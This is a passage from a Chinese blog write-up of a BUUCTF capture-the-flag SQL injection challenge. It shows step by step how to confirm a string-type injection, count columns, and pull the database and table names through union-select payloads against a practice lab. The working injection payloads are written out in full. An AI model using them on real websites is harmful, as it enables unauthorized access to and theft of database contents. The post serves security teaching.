---
title: [BUUCTF从零单排] Web方向 03.Web入门篇之sql注入-1（手工注入详解）
url: https://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247500807&idx=1&sn=0979c2940dfb73a056927aab2d72e141&chksm=cfcf74caf8b8fddcfa9a83c6b75ffdc1aeb654887614882cffdc03e035adadb7e53674b0b3c7&scene=58&subscene=0#rd
source: 娜璋AI安全之家
date: 2024-09-30
fetch_date: 2025-10-06T18:25:49.502541
---

# [BUUCTF从零单排] Web方向 03.Web入门篇之sql注入-1（手工注入详解）

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFC6C7cyr55yLtCjo4WasVykaiakEVic6Q2zgfWFRRezkhJPib0YSqaZic5vg/0?wx_fmt=jpeg)

# [BUUCTF从零单排] Web方向 03.Web入门篇之sql注入-1（手工注入详解）

原创

Eastmount

娜璋AI安全之家

> “
>
> 2024年4月28日是Eastmount的安全星球 —— 『网络攻防和AI安全之家』正式创建和运营的日子，并且已坚持5个月每周7更。该星球目前主营业务为 安全零基础答疑、安全技术分享、AI安全技术分享、AI安全论文交流、威胁情报每日推送、网络攻防技术总结、系统安全技术实战、面试求职、安全考研考博、简历修改及润色、学术交流及答疑、人脉触达、认知提升等。下面是星球的新人券，欢迎新老博友和朋友加入，一起分享更多安全知识，比较良心的星球，非常适合初学者和换安全专业的读者学习。
>
> ”

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROLqpDCG8icFaWSTjKB8kIDbkxVUHG9pQia5x1Rkka4TCJImxS16V6SUruN7aS6sRCuAqpQuuR3bicbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

**忙碌，感恩，陪伴，继续加油！**

这是作者新开的一个专栏《BUUCTF从零单排》，旨在从零学习CTF知识，方便更多初学者了解各种类型的安全题目，后续分享一定程度会对不同类型的题目进行总结，并结合CTF书籍和真实案例实践，希望对您有所帮助。当然，也欢迎大家去BUUCTF网站实践，由于作者能力有限，该系列文章比较基础，写得不好的地方还请见谅，后续会持续深入，加油！

前文介绍了Web方向的基础题目——常见的搜集，该题目主要考察信息收集知识。这篇文章同样是Web方向的题目，主要介绍SQL注入内容——sql注入-1，第一篇详细讲解手工注入，后面再结合工具SQLMAP介绍。为了方便大家思考，文章摘要部分尽量少提，大家也可以先尝试实践，再看WriteUp。基础性文章，希望对您有所帮助，尤其是对网络安全工具的使用和理解。

**文章目录：**

* 一.题目描述
* 二.解题思路

+ 1.注入点判断
+ 2.判断数据库字段

- 方法一：利用union select实现
- 方法二：利用order by实现

+ 3.获取数据库名称
+ 4.获取表名
+ 5.获取表中的字段名
+ 6.获取字段的内容

* 三.探索扩展
* 四.总结

前文赏析：

* [[BUUCTF从零单排] Web方向 01.Web入门篇之粗心的小李解题思路](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247500477&idx=1&sn=9af4359206f3c58e3950258934c5a00f&chksm=cfcf7270f8b8fb661368f38b45fd34859f9662ecfb621c0227d2743d05cdb7bf4cf7142817f6&scene=21#wechat_redirect)
* [[BUUCTF从零单排] Web方向 02.Web入门篇之『常见的搜集』解题思路](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247500516&idx=1&sn=cf1c4a0584c45b3394e06c7164185975&chksm=cfcf7229f8b8fb3f5dfbd0b3253726ac8a8d3353471641b1c4f801e63de5f491462f51bb6b53&scene=21#wechat_redirect)
* [BUUCTF从零单排] Web方向 03.Web入门篇之sql注入-1（手工注入详解）

---

# 一.题目描述

该题目的具体描述如下：

* 题目：[第一章 web入门]SQL注入-1
* 方向：SQL注入
* 来源：《从0到1：CTFer成长之路》书籍配套题目，来源网站：book.nu1l.com

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFCialZZBqbhibNJuwiaXNYn9BXlHyeHcVUmjeicYibo5f9CRL99E9PXRkVQeg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFCyGiaJ7F78UwDC4FIIKia0AElK785HysffC0ZczCCYW4XARDNDwlAicpVg/640?wx_fmt=png&from=appmsg)

接着解锁该题目并开启探索。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFCDu6dmF527FPl6wGU0loCSIoGLH1cbiaBSruwcSl08ddEA49N8hzHTqw/640?wx_fmt=png&from=appmsg)

打开网站如下所示：

* http://814d06ba-e597-4720-a213-6cda3204fa81.node5.buuoj.cn:81/

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFCVPB2JfwAV72HsR0sLEmyiaYLZgqntfBYBqAQfFu8zX85PSHeoPXg20g/640?wx_fmt=png&from=appmsg)

> Happy
> Why am I feeling so happy today? Well, I just got to spend three days with some of my very best friends having fun together. Yes, I am happy because I had so much fun, but I am also happier because of my connections to these people. Belonging to a community of people helps us feel connected to something greater than ourselves. Research has actually shown that people who are part of community have less stress, recover more quickly from illnesses, and have less chance of a mental illness.

---

# 二.解题思路

首先，由网页可知其是PHP网站。接着，打开该网页通过描述，可以知道该题目考察的是信息收集。作为初学者，我们第一想法是网站扫描和源码解析，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFC8eD9PMOeOzMhyDtwJVy6rFyHLo5ibSIBMPRukdHOy2GRwRGn8xON9GA/640?wx_fmt=png&from=appmsg)

然后并没有太多信息，不过看到这种对话框显示内容，我们想到的也是SQL注入，通过不同参数调整来判断对话框中内容，并尝试将数据库的关键信息显示其中。

## 1.注入点判断

首先，通过输入不同的数字，我们可以看到其内容在发生改变。

```
index.php?id=2
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFCPY2vkGNWvNFcxiaKiasvGWTygbaZYVfFoHvut9BfBlUndBsk2Jbq37tw/640?wx_fmt=png&from=appmsg)

在id=3时，系统会给出对应的提示“tips if too diffcult ,add &tips=1 to the url !”。

```
index.php?id=3
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFCIcVcicOsUz5XMbC5xPBD3zBV1iblV4s0uPJQTjFAy1qQln21iceiaza4yA/640?wx_fmt=png&from=appmsg)

而当id大于等于4时，整个内容不再显示，典型的SQL注入题目。

```
index.php?id=4
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFCzarDVP43LZ6VMNxEBLFY7pHKRZy3pc14dxDWzlbcUuk2TZv3uAQ7uQ/640?wx_fmt=png&from=appmsg)

其次，我们需要判断注入点，并且判断是字符型注入还是数字型注入。

* 数字型注入：先尝试判断是否为数字型注入。

```
index.php?id=1 and 1=2
```

> 分析：如果是数字型注入，对应的sql语句为：select \* from notes where id =1 and 1=2。此时会出现报错提示，而当前页面未出现明显变化，因此不是数字型注入。接下来进行字符型注入判断。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFCaxI66EFwbP4Z5aMquCf7ZzG3aicsVHCms1dTibib7cA98ibDA0tqx7uoHA/640?wx_fmt=png&from=appmsg)

* 字符型注入：通过添加特定标点符号判断，发现其内容不再显示。

```
index.php?id=1'
```

> 分析：原因是对应的SQL语句闭合，即：select \* from notes where id =‘1’。此时显示结果异常，进一步确定为字符型注入。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFC0eZT4E1YnxxvENDwWZEt8DCSuA04ic8gZ6j5q8IXIFuA4z9Q4Xf9zAw/640?wx_fmt=png&from=appmsg)

进一步修改URL：

```
index.php?id=1' and 1=2--+
```

此时对应的SQL语句如下，并出现报错信息，自此确定为字符型注入。

```
select * from notes where id ='1' and 1=2 --+';
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFCnaD0PwnJc4yxXJggeKIrZeSBKbkjH21s7eqsUWJrZPLF9Wrd7VBCLg/640?wx_fmt=png&from=appmsg)

---

## 2.判断数据库字段

通常有两种方式判断数据库字段（column）数量。

### 方法一：利用union select实现

核心思想是利用联合查询构建SQL注入关键代码，判断其是否与id=1界面相同。

```
index.php?id=1' union select 1 --+
```

此时运行结果不同，异常显示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFCHYI3ngn5vrDQQXhuIbicOHKsNFm58GkRxoK8LzU95zMnpn06x3vGI5g/640?wx_fmt=png&from=appmsg)

当参数为3个时，发现其与id=1界面相同，如下图所示：

```
index.php?id=1' union select 1,2,3 --+
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFCicQyGIutQUHzthOYlrDjXJGlfib7VqCz1JuslxkFukz6icNAPBgBt9Raw/640?wx_fmt=png&from=appmsg)

而当参数超过3个时，与id=1界面不同。

```
index.php?id=1' union select 1,2,3,4 --+
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFCxR3YTNXxMj5OkAyIqwJpdvnFVQRJvvx5lRRJHdNgOrSU4VVuwqQZ7g/640?wx_fmt=png&from=appmsg)

基于此，判断该条SQL语句的参数为3个。

---

### 方法二：利用order by实现

利用order by的差异判断出有3列数据。

```
index.php?id=1' order by 3 --+
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFC1y8p8B4CcibUJRwjISKuMvib6XerhUJ3xCib5zEBJszyQiafEeyCHtSkug/640?wx_fmt=png&from=appmsg)

其中，order by参数为3时正常显示，其它值均异常显示，因此判断参数为3个。

```
index.php?id=1' order by 4 --+
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFCamsgH3RMx2Z21g9sFK9nEEBVtChf9aQhveiabAiaFe6jUmaibiaIS2icY3g/640?wx_fmt=png&from=appmsg)

---

## 3.获取数据库名称

通过联合查询和关键函数database()获取数据库名称。

* 注意：不同数据库的关键函数存在一定差异，读者可以自行学习和记录。

前面在参数判断中已经看到联合查询的SQL语句，其页面正常显示。

```
正常显示：index.php?id=1' union select 1,2,3 --+
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFCQzpVUXIOlsNnPdyPP0p7nTda68vWFPAmKL5wFLJyWuT02gvzF6GibdA/640?wx_fmt=png&from=appmsg)

首先，将id参数修改为“-1”，可以查看对应的回显内容。通过该方式让SQL注入内容在该部分显示，比如当前显示的为“2、3”，对应第2、3个参数。后续利用回显位进行暴库。

```
异常显示：index.php?id=-1' union select 1,2,3 --+
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFC1mRMLcl2xOibcU7t2nUyjTXsN6FSru3YEVibNbThaXe0cqkaIic94JOtw/640?wx_fmt=png&from=appmsg)

其次，构建SQL注入关键代码获取数据库名称。

```
index.php?id=-1' union select 1,database(),3 --+
```

对应的SQL语句为：

```
select * from notes where id ='1' union select 1,database(),3 --+';
```

显示结果可以看到数据库的名称为：

* note

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFCh9UnZLm0h67fGaAOzZibfMQT72j1FnIU7GdMvKoq1Kf1TCJrlSFxguQ/640?wx_fmt=png&from=appmsg)

---

## 4.获取表名

获取表名的关键代码如下：

* group\_concat(table\_name)：用于获取数据库表的名称
* information\_schema.tables：提供了关于数据库中的表的信息

```
方法1：index.php?id=-1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='note' --+
方法2：index.php?id=-1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

显示结果如下所示，其表名称为：

* fl4g,notes

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRP3CKHEo6LjicibLu9k59hrFCoCHjWwl8wQEhPQUqDD1RmMiakA8wOUC6IYG5IJcuNmtEYn4EJmrQA1g/640?wx_fmt=png&from=appmsg)

> 温馨提示：INFORMATION\_SCHEMA 数据库是MySQL自带的，它提供了访问数据库 元数据的方式，元数据是关于数据的数据，如数据库名或表名、列的数据类型、或访问权限等。
>
>...